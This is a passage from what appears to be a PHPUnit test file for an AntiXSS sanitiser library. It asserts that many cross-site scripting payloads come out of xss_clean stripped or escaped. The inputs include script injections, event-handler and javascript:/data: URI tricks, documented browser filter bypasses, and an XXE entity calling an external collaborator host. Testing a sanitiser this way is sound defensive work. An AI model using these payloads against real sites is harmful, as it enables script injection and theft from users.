            'something)onendtest'                                                                                                                                                                                                                     => 'something)onendtest',
            'something&onendtest'                                                                                                                                                                                                                     => 'something&onendtest',
            'something%onendtest'                                                                                                                                                                                                                     => 'something%onendtest',
            'something\'onendtest'                                                                                                                                                                                                                    => 'something\'onendtest',
            'something"onendtest'                                                                                                                                                                                                                     => 'something"onendtest',
            'something!onendtest'                                                                                                                                                                                                                     => 'something!onendtest',
            'something.onendtest'                                                                                                                                                                                                                     => 'something.onendtest',
            'something#onendtest'                                                                                                                                                                                                                     => 'something#onendtest',
            'something[onendtest'                                                                                                                                                                                                                     => 'something[onendtest',
            'something$onendtest'                                                                                                                                                                                                                     => 'something$onendtest',
            '<a href="https://wiki.product.net/FAQ.Error_during_connect_to_Database_(0)">link</a>'                                                                                                                                                    => '<a href="https://wiki.product.net/FAQ.Error_during_connect_to_Database_(0)">link</a>',
            '<a href="https://example.com/?onlyEnabled=1">link</a>'                                                                                                                                                                                   => '<a href="https://example.com/?onlyEnabled=1">link</a>',
            '<a href="https://example.com/?onlyEnabled=123123foo">link</a>'                                                                                                                                                                           => '<a href="https://example.com/?onlyEnabled=123123foo">link</a>',
            '<2€'                                                                                                                                                                                                                                     => '<2€',
            '<=2€'                                                                                                                                                                                                                                    => '<=2€',
            '< 2 €'                                                                                                                                                                                                                                   => '< 2 €',
            '>2€'                                                                                                                                                                                                                                     => '>2€',
            '< 2€'                                                                                                                                                                                                                                    => '< 2€',
            '<2 €'                                                                                                                                                                                                                                    => '<2 €',
            '<2$'                                                                                                                                                                                                                                     => '<2$',
            '<3'                                                                                                                                                                                                                                      => '<3',
            '≪2 €'                                                                                                                                                                                                                                    => '≪2 €',
            '<35%'                                                                                                                                                                                                                                    => '<35%',
        ];

        $antiXss->removeEvilAttributes(['style']); // allow style-attributes

        foreach ($testArray as $before => $after) {
            static::assertSame($after, $antiXss->xss_clean($before), 'testing: ' . $before);
            static::assertFalse($antiXss->isXssFound(), 'testing: ' . $before . ' | ' . $after);
        }

        $antiXss->addEvilAttributes((['style'])); // re-disallow style-attributes

        // ---

        $antiXssHtml = new AntiXSS();
        $antiXssHtml->removeNeverAllowedRegex(['&lt;!--', '&lt;!--$1--&gt;']);
        $antiXssHtml->removeEvilHtmlTags(['xml', 'html']);
        $antiXssHtml->addDoNotCloseHtmlTags(['xml', 'html', 'o:OfficeDocumentSettings']);
        $html = '
        <html>
        <!-- [if gte mso 9]><xml><o:OfficeDocumentSettings>96</xml><![endif]--> <!-- [if !mso]><!--> <!--<![endif]--> <!-- [if !mso]><!--> <!--<![endif]--><!-- [if IE]><div class="ie-browser"><![endif]-->';
        static::assertSame($html, $antiXssHtml->xss_clean($html));
    }

    public function testRemoveAddStr()
    {
        // init
        $antiXss = new AntiXSS();

        $testArray = [
            '<pre><code>
                &lt;script&gt;
                    foo();
                &lt;/script&gt;
            </code></pre>',
        ];

        $antiXss->removeNeverAllowedStrAfterwards(['&lt;script&gt;', '&lt;/script&gt;']); // allow

        foreach ($testArray as $test) {
            static::assertSame($test, $antiXss->xss_clean($test), 'testing: ' . $test);
        }

        $antiXss->addNeverAllowedStrAfterwards(['&lt;script&gt;', '&lt;/script&gt;']); // re-disallow
    }

    public function testRemoveAddEvents()
    {
        // init
        $antiXss = new AntiXSS();

        $testArray = [
            '<x 1=">" onxxx=1 onAbort="alert(\'foo\');" (text outside tag)' => '<x 1=">" onxxx=1 onAbort="alert&#40;\'foo\'&#41;;" (text outside tag)',
        ];

        $antiXss->removeNeverAllowedOnEventsAfterwards(['onAbort']); // allow

        foreach ($testArray as $before => $after) {
            static::assertSame($after, $antiXss->xss_clean($before), 'testing: ' . $before);
        }

        $antiXss->addNeverAllowedOnEventsAfterwards(['onAbort']); // re-disallow

        // ---

        $testArray = [
            '<x foo="+ - & ? ! ö ä ? `" 1=">" onxxx=1 onAbort="alert(\'foo\');" (text outside tag)' => '<x foo="+ - & ? ! ö ä ? `" 1=">" onxxx=1 ="alert&#40;\'foo\'&#41;;" (text outside tag)',
        ];

        foreach ($testArray as $before => $after) {
            static::assertSame($after, $antiXss->xss_clean($before), 'testing: ' . $before);
        }
    }

    public function testRemoveAddRegex()
    {
        // init
        $antiXss = new AntiXSS();

        $testArray = [
            '<!-- <x 1=">" onxxx=1 onAbort="alert(\'foo\');" (text outside tag) -->' => '&lt;!-- <x 1=">" onxxx=1 ="alert&#40;\'foo\'&#41;;" (text outside tag) -->',
        ];

        $antiXss->removeNeverAllowedRegex(['<!--(.*)-->' => '&lt;!--$1--&gt;']); // allow

        foreach ($testArray as $before => $after) {
            static::assertSame($after, $antiXss->xss_clean($before), 'testing: ' . $before);
        }

        $antiXss->addNeverAllowedRegex(['<!--(.*)-->' => '&lt;!--$1--&gt;']); // re-disallow

        // ---

        $testArray = [
            '<!-- <x 1=">" onxxx=1 onAbort="alert(\'foo\');" (text outside tag) -->' => '&lt;!-- <x 1=">" onxxx=1 ="alert&#40;\'foo\'&#41;;" (text outside tag) --&gt;',
        ];
        foreach ($testArray as $before => $after) {
            static::assertSame($after, $antiXss->xss_clean($before), 'testing: ' . $before);
        }
    }

    public function testXssCleanStringWith3bytes()
    {
        // init
        $antiXss = new AntiXSS();

        $harmStrings = [
            "Hello, i try to <script>alert('Hack');</script> your site"                                     => 'Hello, i try to [removed] your site',
            'Simple clean string'                                                                           => 'Simple clean string',
            "Hello, i try to <script>alert('Hack')</script> your site"                                      => 'Hello, i try to [removed] your site',
            '<a href="http://test.com?param1="+onMouseOver%3D"alert%281%29%3B&step=2&param12=A">test</a>'   => '<a href="http://test.com?param1=">test</a>',
            '<a href="http://test.com?param1="+on💩MouseOver💩%3D"alert%281%29%3B&step=2&param12=A">test</a>' => '<a href="http://test.com?param1=">test</a>',
            '<a href="http://test.com?param1=lall&colon=foo;">test</a>'                                     => '<a href="http://test.com?param1=lall&colon=foo;">test</a>',
            '<a href="http://test.com?param1=lall&colon;=foo;">test</a>'                                    => '<a href="http://test.com?param1=lall&colon;=foo;">test</a>',
            '<a href="http://test.com?param1=lall&colon+lall;">test</a>'                                    => '<a href="http://test.com?param1=lall&colon+lall;">test</a>',
            '<a href="javascript:alert(\'xss\')">xss</a>'                                                   => '<a href="[removed](\'xss\')">xss</a>',
            '<li style="list-style-image: url(alert&#40;0&#41;)">'                                          => '<li [removed]>',
        ];

        $antiXss->setReplacement('[removed]');
        $antiXss->setStripe4byteChars(true);

        foreach ($harmStrings as $before => $after) {
            static::assertSame($after, $antiXss->xss_clean($before), 'testing: ' . $before);
        }

        // reset
        $antiXss->setReplacement('')->setStripe4byteChars(false);
    }

    public function testXssCleanStringArray()
    {
        // init
        $antiXss = new AntiXSS();

        $harmStrings = [
            '<input name="product" value="GOM-KC-350+550">'                                                                       => '&lt;input name="product" value="GOM-KC-350+550"&gt;',
            '<style type="text/css">html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}</style>' => '&lt;style type="text/css"&gt;html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}&lt;/style&gt;',
            '<meta name="viewport" content="width=device-width, initial-scale=1.0, minimal-ui">'                                  => '&lt;meta name="viewport" content="width=device-width, initial-scale=1.0, minimal-ui"&gt;',
            '<meta property="og:description" content="Lars Moelleken: Webentwickler & Sysadmin aus Krefeld" />'                   => '&lt;meta property="og:description" content="Lars Moelleken: Webentwickler & Sysadmin aus Krefeld" /&gt;',
            '&lt;meta name="viewport" content="width=device-width, initial-scale=1.0, minimal-ui"&gt;'                            => '&lt;meta name="viewport" content="width=device-width, initial-scale=1.0, minimal-ui"&gt;',
            '<link href="//fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css"/>'                         => '&lt;link href="//fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css"/&gt;',
            '<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>'                                  => '[removed][removed]',
            '<!--[if lt IE 9]><script src="http://moelleken.org/vendor/bower/nwmatcher/src/nwmatcher.js"></script><![endif]-->'   => '&lt;!--[if lt IE 9]>[removed][removed]<![endif]--&gt;',
            "Hello, i try to <script>alert('Hack');</script> your site"                                                           => 'Hello, i try to [removed] your site',
            'Simple clean string'                                                                                                 => 'Simple clean string',
            "Hello, i try to <script>alert('Hack')</script> your site"                                                            => 'Hello, i try to [removed] your site',
            '<a href="http://test.com?param1="+onMouseOver%3D"alert%281%29%3B&step=2&param12=A">test</a>'                         => '<a href="http://test.com?param1=">test</a>',
            '<a href="http://test.com?param1="+on💩MouseOver💩%3D"alert%281%29%3B&step=2&param12=A">test💩</a>'                      => '<a href="http://test.com?param1=">test💩</a>',
            '<a href="http://test.com?param1=lall&colon=foo;">test</a>'                                                           => '<a href="http://test.com?param1=lall&colon=foo;">test</a>',
            '<a href="http://test.com?param1=lall&colon;=foo;">test</a>'                                                          => '<a href="http://test.com?param1=lall&colon;=foo;">test</a>',
        ];

        $antiXss->setReplacement('[removed]');

        foreach ($harmStrings as $before => $after) {
            static::assertSame($after, $antiXss->xss_clean($before), 'testing: ' . $before);
        }

        // reset
        $antiXss->setReplacement('');
    }

    public function testXssCleanImageValid()
    {
        $harm_string = '<img src="test.png">';

        $xss_clean_return = (new AntiXSS())->xss_clean($harm_string);

        static::assertTrue($xss_clean_return === $harm_string);
    }

    public function testXssCleanImageInvalid()
    {
        $harm_string = '<img src=javascript:alert(String.fromCharCode(88,83,83))>';

        $xss_clean_return = (new AntiXSS())->xss_clean($harm_string);

        static::assertFalse($xss_clean_return === $harm_string);
    }

    public function testXssWithoutStartHtml()
    {
        $testArray = [
            'ads="onClick();" foo="555-666-0606" bar([!+!]) ody="" ></a>' => 'ads="();" foo="555-666-0606" bar([!+!]) ody="" ></a>',
        ];

        $antiXss = new AntiXSS();
        foreach ($testArray as $test => $expected) {
            static::assertSame($expected, $antiXss->xss_clean($test));
        }
    }

    public function testXssHash()
    {
        $antiXss = new AntiXSS();
        static::assertNull($antiXss->isXssFound());

        // init the "_xss_hash"-property
        $result = $antiXss->xss_clean('<void class="bar">foo</ onclick  = "foobar();" void>');
        static::assertSame('<void class="bar">foo</  void>', $result);
        static::assertTrue($antiXss->isXssFound());

        // ---

        $result = $antiXss->xss_clean('<void class="bar">foo</void>');
        static::assertSame('<void class="bar">foo</void>', $result);
        static::assertFalse($antiXss->isXssFound());
    }

    public function testXssClean()
    {
        $harm_string = "Hello, i try to <script>alert('Hack');</script> your site";

        $harmless_string = (new AntiXSS())->xss_clean($harm_string);

        static::assertSame('Hello, i try to  your site', $harmless_string);

        // \v (vertical whitespace) isn't working on travis-ci ?

        $testArray = [
            '<div BACKGROUND="mocha:alert(\'XSS\')">
        <!-- image:xss -->
        <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
        <IMG SRC="jav&#x09;ascript:alert(\'XSS\');">
        <img/src=`%00`" . \n . "onerror=this.onerror=confirm(1)>
        <img/src=`%00` onerror=this.onerror=confirm(1)
        <!-- file:xss -->
        <script SRC="http://absynth.de/x.js"></script>
        <layer SRC="http://absynth.de/x.js"></layer>
        <!-- style:xss -->
        <LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">
        <DIV STYLE="background-image: url(javascript:alert(\'XSS\')">
          <div style=background-image:expression(alert(\'XSS\'));">lall</div>
        </div>
      </div>' => '<div BACKGROUND="(\'XSS\')">
        &lt;!-- image:xss --&gt;
        <IMG >
        & REL="stylesheet" HREF="(\'XSS\');"',
            '<img/src=">" onerror=alert(1)>
      <button/a=">" autofocus onfocus=alert&#40;1&#40;></button>
      <button a=">" autofocus onfocus=alert&#40;1&#40;>' => '<img/>" >
      & a="&gt;"', // autofocus trick | https://html5sec.org/#7
            'http://vulnerable.info/poc/poc.php?foo=%3Csvg%3E%3Cscript%3E/%3C1/%3Ealert(document.domain)%3C/script%3E%3C/svg%3E'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => 'http://vulnerable.info/poc/poc.php?foo=&lt;svg&gt;&lt;/svg&gt;',
            '"><svg><script>/<@/>alert(1337)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '">&lt;svg&gt;alert&#40;1337&#41;', // Bypassing Chrome’s Anti-XSS Filter | 2015: http://vulnerable.info/bypassing-chromes-anti-xss-filter/
            'Location: https://www.google.com%3a443%2fcse%2ftools%2fcreate_onthefly%3b%3c%2ftextarea%3e%3csvg%2fonload%3dalert%28document%2edomain%29%3e%3b%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => 'Location: https://www.google.com:443/cse/tools/create_onthefly;&lt;/textarea&gt;&lt;svg/&gt;;/../../../../../../../../../../../../../../', // Google XSS in IE | 2015: http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html
            'Location: http://example.jp:xyz%27onclick%3D%27a%5Cu006c%5Cu0065%5Cu0072t(1)%27/2.php'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => 'Location: http://example.jp:xyz\'=\'alert&#40;1&#41;\'/2.php',
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><feImage> <set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg=="/></feImage> </svg>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         => '&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;<feImage> <set attributeName="xlink:href" to="PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg=="/></feImage> &lt;/svg&gt;', // SVG-XSS | https://html5sec.org/#95
            '<a target="_blank" href="data:text/html;BASE64youdummy,PHNjcmlwdD5hbGVydCh3aW5kb3cub3BlbmVyLmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5pbm5lckhUTUwpPC9zY3JpcHQ+">clickme in firefox</a><a/\'\'\' target="_blank" href=data:text/html;;base64,PHNjcmlwdD5hbGVydChvcGVuZXIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpPC9zY3JpcHQ+>firefox11</a>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '<a target="_blank" href="PHNjcmlwdD5hbGVydCh3aW5kb3cub3BlbmVyLmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5pbm5lckhUTUwpPC9zY3JpcHQ+">clickme in firefox</a><a/\'\'\' target="_blank">firefox11</a>', // data: URI with base64 encoding bypass exploiting Firefox | 2012: https://bugzilla.mozilla.org/show_bug.cgi?id=255107
            'http://securitee.tk/files/chrome_xss.php?a=<script>void(\'&b=\');alert(1);</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => 'http://securitee.tk/files/chrome_xss.php?a=', // Bypassing Chrome’s Anti-XSS filter | 2012: http://blog.securitee.org/?p=37
            'with(document)body.appendChild(createElement(\'iframe onload=&#97&#108&#101&#114&#116(1)>\')),body.innerHTML+=\'\''                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => 'with(document)body(createElement(\'iframe =alert&#40;1&#41;>\')),body+=\'\'', // IE11 in IE8 docmode #mxss | https://twitter.com/0x6D6172696F/status/626379000181596160
            'http://www.nowvideo.sx/share.php?id=foobar&title=\'\';with(document)body.appendChild(createElement(\\\'iframe onload =&#97&#108&#101&#114&#116(1)>\\\')),body.innerHTML+=\\\'\\\'//\\\';with(document)body.appendChild(createElement(\\\'iframe onload=&#97&#108&#101&#114&#116(1)>\\\')),body.innerHTML+=\\\'\\\'//";with(document)body.appendChild(createElement(\\\'iframe onload=&#97&#108&#101&#114&#116(1)>\\\')),body.innerHTML+=\\\'\\\'//\";with(document)body.appendChild(createElement(\\\'iframe onload=&#97&#108&#101&#114&#116(1)>\\\')),body.innerHTML+=\\\'\\\'//--></SCRIPT>">\'><SCRIPT>with(document)body.appendChild(createElement(\\\'iframe onload=&#97&#108&#101&#114&#116(1)>\\\')),body.innerHTML+=\\\'\\\'</SCRIPT>=&{}'                                                                                                                         => "http://www.nowvideo.sx/share.php?id=foobar&title='';with(document)body(createElement(\'iframe  =alert&#40;1&#41;>\')),body+=\'\'//\';with(document)body(createElement(\'iframe =alert&#40;1&#41;>\')),body+=\'\'//\";with(document)body(createElement(\'iframe =alert&#40;1&#41;>\')),body+=\'\'//\\\";with(document)body(createElement(\'iframe =alert&#40;1&#41;>\')),body+=\'\'//-->\">'>\')),body+=\'\'=&{}",
            '<div><embed allowscriptaccess=always src=/xss.swf><base href=//l0.cm/</div>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '<div>&lt;embed allowscriptaccess=always src=/xss.swf&gt;&lt;base href=//l0.cm/&lt;/div&gt;', // 2016 | http://mksben.l0.cm/2016/05/xssauditor-bypass-flash-basetag.html
            '<base href="javascript:/a/+alert(1)//">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   => '&lt;base href="/a/+alert&#40;1&#41;//"&gt;',
            '<base href=data:/,alert(1)/>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '&lt;base href=data:/,alert&#40;1&#41;/&gt;',
            '<base href=javascript:/0/><iframe src=,alert(1)></iframe>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '&lt;base href=/0/&gt;&lt;iframe src=,alert&#40;1&#41;&gt;&lt;/iframe&gt;',
            '<!DOCTYPE foo [&lt;!ENTITY xxe46471 SYSTEM "http://4mr71zbvk10c5vd1k074izfvbmhnxdi7xw.burpcollaborator.net"> ]>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '&lt;!DOCTYPE foo [&lt;!ENTITY xxe46471 SYSTEM "http://4mr71zbvk10c5vd1k074izfvbmhnxdi7xw.burpcollaborator.net"> ]>', // XXE injection | 2015: http://blog.portswigger.net/2015/05/burp-suite-now-reports-blind-xxe.html
            "<iframe name=alert(1) src=\"//somedomain?x=',__defineSetter__('x',eval),x=name,'\"></iframe>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '&lt;iframe name=alert&#40;1&#41; src="//somedomain?x=\',__defineSetter__(\'x\',eval),x=name,\'"&gt;&lt;/iframe&gt;',
            "<script>x = '',__defineSetter__('x',alert),x=1,'';</script>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '', // NoScript XSS filter bypass | 2015: http://blog.portswigger.net/2015/07/noscript-xss-filter-bypass.html
            '"><a href="JAVASCRIPT:%E2%80%A8alert`1`">CLICKME 😃'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '"><a href="">CLICKME 😃', // NoScript XSS filter bypass | 2015: https://twitter.com/0x6D6172696F/status/623081477002014720?s=02
            '<div id="b" style="font-family:a/**/ression(alert(1))(\'\\\')exp\\\')">aa</div>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '<div id="b" >aa</div>', // IE | 2014: http://wooyun.org/bugs/wooyun-2014-068564
            '<a href="jar:http://SEVER/flash3.bin!/flash3.swf">xss</a>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '<a href="//SEVER/flash3.bin!/flash3.swf">xss</a>', // Firefox | 2007: https://bugzilla.mozilla.org/show_bug.cgi?id=369814
            '<li><a href="?bypass=%3Clink%20rel=%22import%22%20href=%22?bypass=%3Cscript%3Ealert(document.domain)%3C/script%3E%22%3E">Now click to execute arbitrary JS</a></li>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => '<li><a href="">Now click to execute arbitrary JS</a></li>', // Chrome 33 | 2015: view-source:https://html5sec.org/test/bypass
            '<scr<script>ipt>alert(1)</sc<script>ri<script>pt>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         => '<scralert&#40;1&#41;&lt;/scpt>', // 2015: https://frederic-hemberger.de/talks/froscon-xss/#/17
            '<svg </onload ="1> (_=alert,_(1337)) "">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '&lt;svg &lt;/"&gt;',
            '<svg><script>/<@/>alert(1)</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => '&lt;svg&gt;alert&#40;1&#41;',
            '<svg/onload=alert`xss`>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   => '&lt;svg/&gt;', // FF34+, Edge | 2015 | https://www.davidsopas.com/win-50-amazon-gift-card-with-a-xss-challenge/
            '<script/src=//⑭.₨>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '', // Edge | 2016 | https://twitter.com/0x6D6172696F/status/784356959063535616
            '<p/onclick=alert(/xss/)>a'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '<p/>a',
            '<iframe/src=//14.rs>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => '&lt;iframe/src=//14.rs&gt;',
            '<iframe src="https:http://example.com ">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '&lt;iframe src="https:http://example.com "&gt;',
            '<p/oncut=alert`xss`>x'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '<p/>x',
            '<svg/onload=alert(/XSS/)>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '&lt;svg/&gt;', // FF40 | 2015 | https://www.davidsopas.com/win-50-amazon-gift-card-with-a-xss-challenge/
            '<http://onclick%3d1/alert%601%60//'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '&lt;http://', // 2015 | https://twitter.com/brutelogic/status/673098162635202560
            '<a href="data:　, &lt &NewLine; script &gt alert(1) &lt /script &gt ">CLICK'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                => '<a href="">CLICK', // FF45 | 2016 | https://twitter.com/0x6D6172696F/status/716364272889176064
            'http://www.wolframalpha.com/input/?i=1&n=%22%3E%3Cscript%20src=//3237054390/1%3E'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          => 'http://www.wolframalpha.com/input/?i=1&n=">', // 2015 | https://twitter.com/brutelogic/status/671740844450426880
            '<svg onload=1?alert(9):0>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '&lt;svg &gt;', // 2015 | https://twitter.com/brutelogic/status/669852435209416704
            '<style>@KeyFrames x{</style><div style=animation-name:x onanimationstart=alert(1)> <'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => '&lt;style&gt;@KeyFrames x{&lt;/style&gt;<div  > <', // Chrome | 2016 | https://twitter.com/0x6D6172696F/status/669183179165720576
            '<style>:target{zoom:2;transition:1s}</style><div id=x ontransitionend=alert(1)>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           => '&lt;style&gt;:target{zoom:2;transition:1s}&lt;/style&gt;<div id=x >', // https://twitter.com/cgvwzq/status/684316889221337088
            '<brute contenteditable onblur=alert(1)>lose focus!<brute onclick=alert(1)>click this!<brute oncopy=alert(1)>copy this!<brute oncontextmenu=alert(1)>right click this!<brute oncut=alert(1)>copy this!<brute ondblclick=alert(1)>double click this!<brute ondrag=alert(1)>drag this!<brute contenteditable onfocus=alert(1)>focus this!<brute contenteditable oninput=alert(1)>input here!<brute contenteditable onkeydown=alert(1)>press any key!<brute contenteditable onkeypress=alert(1)>press any key!<brute contenteditable onkeyup=alert(1)>press any key!<brute onmousedown=alert(1)>click this!<brute onmousemove=alert(1)>hover this!<brute onmouseout=alert(1)>hover this!<brute onmouseover=alert(1)>hover this!<brute onmouseup=alert(1)>click this!<brute contenteditable onpaste=alert(1)>paste here!<brute style=font-size:500px onmouseover=alert(1)>0000' => '<brute contenteditable >lose focus!<brute >click this!<brute >copy this!<brute >right click this!<brute >copy this!<brute >double click this!<brute >drag this!<brute contenteditable >focus this!<brute contenteditable >input here!<brute contenteditable >press any key!<brute contenteditable >press any key!<brute contenteditable >press any key!<brute >click this!<brute >hover this!<brute >hover this!<brute >hover this!<brute >click this!<brute contenteditable >paste here!<brute  >0000', // 2015 | http://brutelogic.com.br/blog/agnostic-event-handlers/
            '<x contextmenu=">"><acronym%0Cx=""%09oncut+=%09d=document;a=d.createElement("a");a.href="img/hacked1.jpg";a.download="open.me";d.body.appendChild(a);a.click()+><option><input type=submit>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '<x contextmenu=">"><acronymx=""%09+=%09d=document;a=d.createElement("a");a.href="img/hacked1.jpg";a.download="open.me";d.body(a);a.click()+><option>&lt;input type=submit&gt;', // http://brutelogic.com.br/webgun/
            '<h1/onclick=alert(1)>a'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    => '<h1/>a',
            '")}alert(/XSS/);{//'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => '")}alert&#40;/XSS/&#41;;{//',
            '<svg onload=alert(1)>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     => '&lt;svg &gt;', // 2015: https://twitter.com/ret2libc/status/635923671681507328
            "<style onload='execScript(/**/\"\x61lert&#40 1&#41\",\"j\x61vascript\");'>"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                => '&lt;style &gt;', // IE | 2015: https://twitter.com/soaj1664ashar/status/635040931289370624
            '<​script>alert `1`</script>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               => '',
            '<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    => '&lt;form id="test"&gt;&lt;/form&gt;&lt;button  &gt;X&lt;/button&gt;',
            '<input onfocus=write(1) autofocus>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '&lt;input  autofocus&gt;',
            '<input onblur=write(1) autofocus><input autofocus>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '&lt;input  autofocus&gt;&lt;input autofocus&gt;',
            '<video poster=javascript:alert(1)//></video>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              => '&lt;video /&gt;&lt;/video&gt;',
            '<Video> <source onerror = "javascript: alert (XSS)">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => '&lt;Video&gt; &lt; &gt;',
            '<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      => '&lt;body &gt;<br><br><br><br><br><br>...<br><br><br><br>&lt;input autofocus&gt;',
            '<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => '&lt;form id=test &gt;&lt;input&gt;&lt;/form&gt;&lt;button  &gt;X&lt;/button&gt;',
            '<video><source onerror="alert(1)">'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        => '&lt;video&gt;&lt; &gt;',
            '<video onerror="alert(1)"><source></source></video>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       => '&lt;video &gt;&lt;source&gt;&lt;/source&gt;&lt;/video&gt;',
            '<form><button formaction="javascript:alert(1)">X</button>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 => '&lt;form&gt;&lt;button &gt;X&lt;/button&gt;',
            '<body oninput=alert(1)><input autofocus>'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  => '&lt;body &gt;&lt;input autofocus&gt;',
